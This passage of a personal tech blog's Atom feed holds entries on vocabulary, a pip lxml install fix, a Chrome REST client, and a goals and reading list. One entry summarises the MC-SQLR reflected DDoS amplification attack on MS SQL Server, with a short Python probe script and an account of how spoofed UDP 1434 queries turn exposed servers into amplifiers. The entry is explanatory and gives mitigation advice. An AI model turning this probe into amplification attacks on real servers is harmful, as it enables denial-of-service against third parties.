  2. 鑿；挖  
  3. 欺詐  
vt.及物動詞  
  1. 用半圓鑿子挖；挖出  
  2. 欺騙  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;prodigy  
KK[ˋprɑdədʒɪ] DJ[ˋprɔdidʒi]  
n.[C]可數名詞  
  1. 奇蹟，奇事；奇觀  
  2. 奇才，天才  
    a child prodigy  
    神童  
  3. 【古】預兆  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Vocabulary"></category><category term="Halt and Catch Fire"></category><category term="TV Series"></category><category term="Geek"></category><category term="English"></category></entry><entry><title>pip install lxml fail in Mac</title><link href="https://blog.m157q.tw/posts/2015/02/04/pip-install-lxml-fail-in-mac/" rel="alternate"></link><published>2015-02-11T04:25:05+08:00</published><updated>2015-02-11T04:25:05+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-02-04:posts/2015/02/04/pip-install-lxml-fail-in-mac/</id><summary type="html">&lt;p&gt;While I built up the develope environment for &lt;code&gt;Pelican&lt;/code&gt; on my Mac OSX 10.9,&lt;br /&gt;
I encounterd this problem below:  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;In&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="n"&gt;included&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lxml&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lxml&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;etree&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nl"&gt;c&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;239&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;  

    &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;private&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;folders&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;v2&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;td9_yf3x7lv6myk_9cy1_h640000gn&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;pip&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;UkRKm0&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lxml&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;src&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;lxml&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;includes&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;  
&lt;span class="n"&gt;tree_defs&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nl"&gt;h&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;fatal&lt;/span&gt; &lt;span class="nl"&gt;error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;libxml&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;xmlversion&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="n"&gt;not&lt;/span&gt; &lt;span class="n"&gt;found&lt;/span&gt;  

    &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="n"&gt;include&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;libxml/xmlversion.h&amp;quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Solution&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ brew install libxml2  
$ brew link libxml2 --force  
$ &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;C_INCLUDE_PATH&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/local/Cellar/libxml2/2.9.2/include/libxml2:&lt;span class="nv"&gt;$C_INCLUDE_PATH&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Reference&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/17857858/fail-to-install-lxml-in-macos-10-8-4"&gt;python - Fail to install lxml in MacOS 10.8.4 - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="pip"></category><category term="lxml"></category><category term="Mac"></category><category term="Pelican"></category></entry><entry><title>MC-SQLR 放大攻擊</title><link href="https://blog.m157q.tw/posts/2015/01/22/mc-sqlr-amplification-attack/" rel="alternate"></link><published>2015-10-27T11:44:00+08:00</published><updated>2015-10-27T11:44:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-01-22:posts/2015/01/22/mc-sqlr-amplification-attack/</id><summary type="html">&lt;p&gt;在 Twitter 上看到  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://twitter.com/hdmoore/status/558041881138192386"&gt;HD Moore on Twitter: "MS SQL Server Resolution Service enables reflected DDoS with 440x amplification http://t.co/wAy3szhseR &amp;lt; Still 200k+ vulnerable IPs on IPv4"&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;原文連結&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://kurtaubuchon.blogspot.tw/2015/01/mc-sqlr-amplification-ms-sql-server.html"&gt;Default Deny: MC-SQLR Amplification: MS SQL Server Resolution Service enables reflected DDoS with 440x amplification&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;大致上是說在 2014 聖誕夜&lt;br /&gt;
有個據信由 Bitcoin Baron 發起的&lt;br /&gt;
針對 the City of Columbia, Missouri 的網站&lt;br /&gt;
進行的 DDoS 攻擊中&lt;br /&gt;
發現大量的 &lt;code&gt;1434/UDP&lt;/code&gt; 封包&lt;br /&gt;
此類封包的平均大小大約為 441 bytes (含 header)&lt;br /&gt;
封包內容長得像這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ServerName;WIN3H1QPRPTOAS;InstanceName;MSSQLSERVER;  
IsClustered;No;Version;9.00.5000.00;tcp;1433;np;  
\\WIN3H1QPRPTOAS\pipe\sql\query;;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;經由作者追查後發現&lt;br /&gt;
是 MS SQL Server Resolution Service 所使用的&lt;br /&gt;
稱為 MC-SQLR 的 Protocol&lt;br /&gt;
存在於 MS SQL Server 2000 及其以後的版本中&lt;br /&gt;
client 只要送 1 bytes 的 data 就會讓 Server 回傳此封包&lt;br /&gt;
範例的 python3 sciprt 蠻簡單的  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;socket&lt;/span&gt;  

&lt;span class="n"&gt;HOST_IP&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;192.168.1.1&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;sock&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_DGRAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;HOST_IP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1434&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="n"&gt;qry&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromhex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;02&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;qry&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;ans&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sock&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5120&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ans&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;將封包扣除 header 的大小後&lt;br /&gt;
大約是 220 bytes 左右&lt;br /&gt;
所以放大了 220 倍左右&lt;br /&gt;
(此為作者後來修正，原先沒扣掉封包 Header 的平均大小約為 440 bytes)&lt;br /&gt;
攻擊者透過 botnet 並將 source ip 偽造成 victim ip&lt;br /&gt;
向網路上運行此服務的 Public MS SQL Server 發送此種封包&lt;br /&gt;
導致這些 Server 成為 Amplifier&lt;br /&gt;
間接對 victim 造成 DDoS 攻擊  &lt;/p&gt;
&lt;p&gt;而將此 Resolution Service 關閉會影響一些正常的服務&lt;br /&gt;
所以作者建議不要將有運行此 Service 的 MS SQL Server&lt;br /&gt;
放在 Public Network  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The behavior exploited in this reflection attack is a key component of the functioning of MS SQL Server 2000 and later.&lt;br /&gt;
Disabling this service is likely not to be an option.&lt;br /&gt;
It may be possible to limit the address space to which a server will respond to CLNT_BCAST_EX messages.&lt;br /&gt;
Most of all, though, owners of SQL Servers should question whether their servers should really be exposed to the internet in the first place.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;有趣的是&lt;br /&gt;
作者提到在 MC-SQLR protocol documentation 中&lt;br /&gt;
有個關於安全的段落 &lt;a href="https://msdn.microsoft.com/en-us/library/cc219741.aspx"&gt;5.1 Security Considerations for Implementers&lt;/a&gt;&lt;br /&gt;
 寫著  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;"No security considerations are associated with the SQL Server Resolution Protocol"  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;他建議 M$ 該修改這部分了XD  &lt;/p&gt;</summary><category term="DDoS"></category><category term="MC-SQLR"></category><category term="Amplification Attack"></category><category term="Security"></category></entry><entry><title>DHC - REST/HTTP API Client</title><link href="https://blog.m157q.tw/posts/2015/01/21/dhc-rest-http-api-client/" rel="alternate"></link><published>2015-02-11T18:27:00+08:00</published><updated>2015-02-11T18:27:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-01-21:posts/2015/01/21/dhc-rest-http-api-client/</id><summary type="html">&lt;p&gt;&lt;a href="https://chrome.google.com/webstore/detail/dhc-resthttp-api-client/aejoelaoggembcahagimdiliamlcdmfm?hl=en"&gt;DHC - REST/HTTP API Client - Chrome Web Store&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;可以選 http/https 和不同的 method&lt;br /&gt;
然後自訂要送出的 request&lt;br /&gt;
send 之後會顯示 server 回傳內容的 source code&lt;br /&gt;
也會把該次 request 做記錄&lt;br /&gt;
方便之後修改&lt;br /&gt;
手動踹網站的時候蠻方便的  &lt;/p&gt;</summary><category term="Chrome"></category><category term="CTF"></category><category term="DHC"></category><category term="Security"></category></entry><entry><title>Goals and Records</title><link href="https://blog.m157q.tw/posts/2015/01/21/goals-and-records/" rel="alternate"></link><published>2018-01-24T17:46:00+08:00</published><updated>2018-01-24T17:46:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-01-21:posts/2015/01/21/goals-and-records/</id><summary type="html">&lt;h2&gt;Reading&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2018  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2018/01/14/soft-skiils-the-software-developers-life-manual/"&gt;《軟技能：代碼之外的生存指南》&lt;/a&gt; (2018/01/14)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2018/01/15/the-pragmatic-programmer-from-journeyman-to-master/"&gt;《程序员修炼之道:从小工到专家》&lt;/a&gt; (2018/01/15)  &lt;/li&gt;
&lt;li&gt;[ ] C Programming: A Modern Approach  &lt;/li&gt;
&lt;li&gt;[ ] UNIX and Linux System Administration Handbook  &lt;/li&gt;
&lt;li&gt;[ ] Python Essential Reference  &lt;/li&gt;
&lt;li&gt;[ ] Programming Interviews Exposed: Secrets to Landing Your Next Job  &lt;/li&gt;
&lt;li&gt;[ ] Unix 內核源碼剖析  &lt;/li&gt;
&lt;li&gt;[ ] Programming from the Ground Up  &lt;/li&gt;
&lt;li&gt;[ ] 挑戰程序設計競賽  &lt;/li&gt;
&lt;li&gt;[ ] The Rootkit Arsenal: Escape and Evasion in the Dark Corners of the System  &lt;/li&gt;
&lt;li&gt;[ ] Free Software, Free Society  &lt;/li&gt;
&lt;li&gt;[ ] Node.js in Action  &lt;/li&gt;
&lt;li&gt;[ ] The Way of Algorithms  &lt;/li&gt;
&lt;li&gt;[ ] Hacking Exposed 7th  &lt;/li&gt;
&lt;li&gt;[ ] 浴缸裡的驚歎: 256道讓你恍然大悟的趣題  &lt;/li&gt;
&lt;li&gt;[ ] K&amp;amp;R  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2017  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2017/02/09/panama-papers/"&gt;《巴拿馬文件》(Panama Papers)&lt;/a&gt; (2017/02/09)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2017/02/19/tekkonkinkreet/"&gt;《惡童當街》漫畫 1~3 集（完）&lt;/a&gt; (2017/02/19)  &lt;/li&gt;
&lt;li&gt;[o] 《不能不去愛的兩件事》 (2017/02/25)  &lt;ul&gt;
&lt;li&gt;二二八連假跑去弟的租屋處一起打遊戲，他說他女友要他看這本書，出於無聊和好奇，就跟他借來讀完了。怎麼說呢，算是勵志類型吧，我覺得自己偶爾需要閱讀這類的書籍來找尋讓自己活下去的動力。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] The Old Man and the Sea (2017/05/07)  &lt;ul&gt;
&lt;li&gt;嗯，這本好像是去年五月在信義誠品買的，當時好像覺得想找些英文書來閱讀，剛好看到老人與海，薄薄的，想說應該很快就看完了，但還是拖了一年才看完，而且老實說我真的沒有很明白內容，大概是我英文太差，但真的覺得內容...有點無趣 XDrz  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] 《最有生產力的一年》 (2017/06/19)  &lt;ul&gt;
&lt;li&gt;作者親自花了一年的時間去試驗各種促進生產力的方法，並將其紀錄下來後，選出自己覺得最有效的幾種方法紀錄於書中，也有探討到我自己比較在意的拖延症問題。也提到了生產力領域的幾本著作，例如：Get Things Done （中譯《搞定》）、《為什麼我們這樣生活那樣工作》。開始嘗試書中提到的方法，有點效果，但還不盡理想。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] 《瘂弦詩集》 (2017/06/19)  &lt;ul&gt;
&lt;li&gt;瘂弦算是以前上國文課的時候有點印象的詩人，以前偶爾就有讀些詩集的習慣，今年逛國際書展的時候看到這本，翻了一下覺得不錯就買了。（喔，最近買了一台健身車，這本是邊踩健身車邊看完的，算是今年想開始養成的一個好習慣之一吧，邊運動邊閱讀，挺好的。）  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] 《1984》 (2017/07/11)  &lt;ul&gt;
&lt;li&gt;真的是一本神作，寫於 1948 年，但彷彿預言書般的看到白色恐怖、紅衛兵、文化大革命等等，也許也是因為歷史不斷在重演吧。  &lt;/li&gt;
&lt;li&gt;對於極權主義的諷刺與深刻描寫，對於資本主義的資源分配越趨兩極的描寫，再加上人類根深蒂固的階級，讓人讀起來有股深深的無力感，卻也因為貼近現實而更加無奈。  &lt;/li&gt;
&lt;li&gt;是部需要一定的年紀才讀得懂的，畢竟是部反烏托邦的作品。也是反烏托邦三部曲裡頭我看的第一部，之後應該也會找時間看《美麗新世界》和《動物農莊》。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] 《銀河便車指南》 (2017/08/06)  &lt;ul&gt;
&lt;li&gt;只看了三部五本裡頭的第一本，但大部份有名的哏例如：42 好像都在這本就出現了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.books.com.tw/products/0010731198"&gt;《搞定！：工作效率大師教你: 事情再多照樣做好的搞定 5 步驟》(Getting Things Done: The Art of Stress-Free Productivity)&lt;/a&gt; (2017/10/11)  &lt;ul&gt;
&lt;li&gt;鼎鼎大名的時間管理聖經 GTD，但看完之後其實挺失望的，覺得有太多的老生常談，不知道是不是因為之前看的時間管理書籍都是受到這本的影響還是怎樣。  &lt;/li&gt;
&lt;li&gt;只有最後幾章讓我覺得比較有學到一些新的東西，而不是只有一直在談方法和觀念，個人覺得《最有生產力的一年》比這本好看多了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://www.tenlong.com.tw/products/9789862767191"&gt;《易讀程式之美學》(The Art of Readable Code)&lt;/a&gt; (2017/10/12)  &lt;ul&gt;
&lt;li&gt;排版很舒服，而且內容幾乎都是條列式的，很適合重點式掃讀，第一次先讀個大概，第二次再更深一層，第三次再比第二次更深一層，畢竟書也沒有很厚。  &lt;/li&gt;
&lt;li&gt;幾乎都有舉出程式碼的實際例子要如何修改，而且會重點列出修改前和修改後的比較，讓人一目了然。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.books.com.tw/products/0010659524"&gt;《腦力密集產業的人才管理之道》(Peopleware)&lt;/a&gt; (2017/10/17)  &lt;ul&gt;
&lt;li&gt;這本真的是跟《人月神話》相輔相成，就像封底上說的「《人月神話》著重在軟體開發，《Peopleware》則著重在人。」  &lt;/li&gt;
&lt;li&gt;拿很多實際的例子和數字來分析結論，然後作者挺幽默的。  &lt;/li&gt;
&lt;li&gt;許多關於工作環境營造的部分真的是心有戚戚焉，要是軟體產業的管理職都有看過這兩本書的話就好了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2016  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="https://selfstore.io/products/190"&gt;程序员跳槽全攻略&lt;/a&gt; (2016/01/07)  &lt;/li&gt;
&lt;li&gt;[o] 編程人生（上）(Coders at work) (2016/02/14)  &lt;/li&gt;
&lt;li&gt;[o] 編程人生（下）(Coders at work) (2016/03/14)  &lt;ul&gt;
&lt;li&gt;&lt;a href="/posts/2016/06/16/coders-at-work/"&gt;《編程人生》(Coders at Work)&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/06/23/認識虛擬化技術的第一本書/"&gt;《認識虛擬化技術的第一本書》&lt;/a&gt; (2016/05/09)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/05/15/imprisoned-taiwan/"&gt;《被囚禁的台灣》&lt;/a&gt; (2016/05/15)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/07/12/科學的極致-漫談人工智能/"&gt;《科學的極致：漫談人工智能》&lt;/a&gt; (2016/05/22)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/07/11/fortress-besieged/"&gt;《圍城》&lt;/a&gt; (2016/07/10)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/07/14/蟬堡-沒有夢的小鎮/"&gt;《蟬堡：沒有夢的小鎮》&lt;/a&gt; (2016/07/14)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/08/02/蟬堡-全世界我們最可憐/"&gt;《蟬堡：全世界我們最可憐》&lt;/a&gt; (2016/07/20)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/09/05/the-mythical-man-month/"&gt;《人月神話：20 週年紀念版》&lt;/a&gt; (2016/08/02)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/09/09/programming-interviews-exposed-third-edition/"&gt;《程序員面試攻略》(Programming Interviews Exposed: Secrets to Landing Your Next Job)&lt;/a&gt; (2016/08/25)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/09/18/9-algorithms-that-changed-the-future/"&gt;《改變世界的九大演算法》&lt;/a&gt; (2016/09/17)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/12/21/pragmatic-thinking-and-learning-refactor-your-wetware/"&gt;《程序員思維修煉》(Pragmatic Thinking and Learning: Refactor Your Wetware)&lt;/a&gt; (2016/11/13)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="https://zh.wikipedia.org/wiki/%E6%80%AA%E7%8D%B8%E8%88%87%E7%89%A0%E5%80%91%E7%9A%84%E7%94%A2%E5%9C%B0"&gt;《怪獸與牠們的產地》(Fantastic Beasts &amp;amp; Where to Find Them)&lt;/a&gt; (2016/11/29)  &lt;ul&gt;
&lt;li&gt;因為看了電影，所以跟同事借了 2001 年出版的這本書來看，內容非常短，但挺有趣的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2016/12/10/new-programmers-survival-manual-navigate-your-workplace-cube-farm-or-startup/"&gt;程序員修煉之道 專業程序員必知的 33 個技巧 （New Programmer's Survival Manual: Navigate Your Workplace, Cube Farm, or Startup）&lt;/a&gt; (2016/12/10)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;[o] Just for Fun: The Story of an Accidental Revolutionary  (2015/05)  &lt;/li&gt;
&lt;li&gt;[o] The Pragmatic Programmers (2015/06)  &lt;/li&gt;
&lt;li&gt;[o] Gray Hat Python: Python Programming for Hackers and Reverse Engineers (2015/07)  &lt;/li&gt;
&lt;li&gt;[o] The Art of Deception (2015/08)  &lt;/li&gt;
&lt;li&gt;[o] Clean Code: A Handbook of Agile Software Craftsmanship (2015/09)  &lt;/li&gt;
&lt;li&gt;[o] The Art of Intrusion (2015/10/16)  &lt;/li&gt;
&lt;li&gt;[o] Writing Idiomatic Python 3 (2015/10/30)  &lt;/li&gt;
&lt;li&gt;[o] The Cathedral and the Bazaar 大教堂與市集 (2015/11/11)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="http://www.hi-on.org.tw/bulletins.jsp?b_ID=152337"&gt;建國路上 Tī Hit-tiâu Kiàn-kok ê lōo&lt;/a&gt; (2015/11/11)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Health&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2018  &lt;ul&gt;
&lt;li&gt;[ ] Lose weight to 65 kg  &lt;/li&gt;
&lt;li&gt;[ ] Lose body fat to 10%  &lt;/li&gt;
&lt;li&gt;[ ] Muscle Training for six-pack abs  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2017  &lt;ul&gt;
&lt;li&gt;[o] Lose weight to 80 kg  &lt;/li&gt;
&lt;li&gt;[o] Lose body fat to 28%  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Contests&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2018  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2018/01/19/2018-ithelp-ironman/"&gt;2018 iT 邦幫忙鐵人賽參賽心得&lt;/a&gt; (2018/01/19)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2015  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="/posts/2015/03/30/0ctf-2015-note/"&gt;0CTF 2015 Note - Just for noting&lt;/a&gt;  (2015/03/30)  &lt;/li&gt;
&lt;li&gt;[o] TSCC 5th (2015/06/03~04)  &lt;ul&gt;
&lt;li&gt;Prize: An Excellent Work  &lt;/li&gt;
&lt;li&gt;&lt;a href="/posts/2015/09/15/tscc-2015-notes-and-thoughts/"&gt;TSCC 2015 Notes and Thoughts - Just for noting&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2015/08/29/hitcon-2015-iot-wargame/"&gt;HITCON 2015 IOT Wargame - Just for noting&lt;/a&gt; (2015/08/29)  &lt;/li&gt;
&lt;li&gt;[o] &lt;a href="/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/"&gt;HITCON CTF 2015 Quals Write-up - Just for noting&lt;/a&gt;  (2015/10/19)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Contributing to open source projects&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;2018  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/tipsy/github-profile-summary/pull/66"&gt;Fix README for using GitHub tokens while running via Docker locally by M157q · Pull Request #66 · tipsy/github-profile-summary · GitHub&lt;/a&gt; (2018/01/08)  &lt;/li&gt;
&lt;li&gt;[ ] Send PR back to &lt;a href="https://github.com/M157q/imageme"&gt;imageme&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;[ ] &lt;a href="https://github.com/passcod/twd"&gt;https://github.com/passcod/twd&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;Height is wrong  &lt;/li&gt;
&lt;li&gt;Need package on AUR  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[ ] &lt;a href="https://github.com/Guake/guake"&gt;https://github.com/Guake/guake&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/Guake/guake/issues/117"&gt;shortcut for toggling transparency · Issue #117 · Guake/guake · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Guake/guake/commit/b2fd53053b0ff61757ca8fac2f97b3fa10d0be30"&gt;Add shortcut for transparency (fix #481) · Guake/guake@b2fd530 · GitHub&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;[ ] &lt;a href="https://github.com/wdv4758h/LTCC"&gt;https://github.com/wdv4758h/LTCC&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;[ ] &lt;a href="https://datecloud.hackpad.com/"&gt;https://datecloud.hackpad.com/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;[ ] xrandr - cannot detect MacBook Air thunderbolt hotplug  &lt;/li&gt;
&lt;li&gt;[ ] wicd - add proxy setting functionality  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2017  &lt;ul&gt;
&lt;li&gt;[o] &lt;a href="https://github.com/fntsrlike/slack-irc-syncbot/pull/25"&gt;Fix #24 by M157q · Pull Request #25 · fntsrlike/slack-irc-syncbot · GitHub&lt;/a&gt; (2017/01/04)  &lt;/li&gt;
